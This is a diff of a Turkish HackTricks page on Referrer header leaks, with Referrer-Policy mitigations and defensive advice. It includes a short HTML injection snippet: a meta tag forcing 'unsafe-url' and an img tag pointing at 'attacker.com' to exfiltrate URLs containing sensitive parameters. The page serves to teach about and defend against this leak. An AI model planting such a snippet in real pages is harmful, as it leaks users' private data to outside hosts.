@@ -1,16 +1,18 @@
+# İlginç HTTP
+
 {{#include ../banners/hacktricks-training.md}}
 
-# Referrer başlıkları ve politikası
+## Referrer header'ları ve policy
 
-Referrer, tarayıcılar tarafından önceki ziyaret edilen sayfayı belirtmek için kullanılan başlıktır.
+Referrer, tarayıcıların daha önce ziyaret edilen sayfayı belirtmek için kullandığı header'dır.
 
-## Hassas bilgilerin sızdırılması
+### Hassas bilgilerin leak olması
 
-Eğer bir web sayfasında herhangi bir noktada hassas bilgiler GET isteği parametrelerinde yer alıyorsa, eğer sayfa dış kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcının saldırgan tarafından kontrol edilen bir URL'yi ziyaret etmesini sağlamak için (sosyal mühendislik) bir şekilde yönlendirebiliyorsa, en son GET isteğindeki hassas bilgileri dışarı sızdırabilir.
+Bir web sayfasının herhangi bir noktasında GET request parametrelerinde hassas bilgiler bulunuyorsa, sayfa harici kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcıyı saldırganın kontrol ettiği bir URL'yi ziyaret etmeye ikna edebiliyor/öneride bulunabiliyorsa (social engineering), hassas bilgileri en son GET request içinde exfiltrate edebilir.
 
-## Azaltma
+### Mitigation
 
-Tarayıcının hassas bilgilerin diğer web uygulamalarına gönderilmesini **önleyebilecek** bir **Referrer-policy** izlemesini sağlayabilirsiniz:
+Tarayıcının, hassas bilgilerin diğer web uygulamalarına gönderilmesini **önleyebilecek** bir **Referrer-policy** izlemesini sağlayabilirsiniz:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -21,15 +23,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Karşı Önlem
+### Karşı Önlem
 
-Bu kuralı bir HTML meta etiketi kullanarak geçersiz kılabilirsiniz (saldırganın bir HTML enjeksiyonu gerçekleştirmesi gerekir):
+Bu kuralı bir HTML meta tag'i kullanarak geçersiz kılabilirsiniz (saldırganın bir HTML injection açığından yararlanması gerekir):
 ```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
 ## Savunma
 
-Hassas verileri asla GET parametreleri veya URL'deki yolların içine koymayın.
+URL içindeki GET parametrelerine veya path'lere hiçbir zaman hassas veri koymayın.
 
 {{#include ../banners/hacktricks-training.md}}
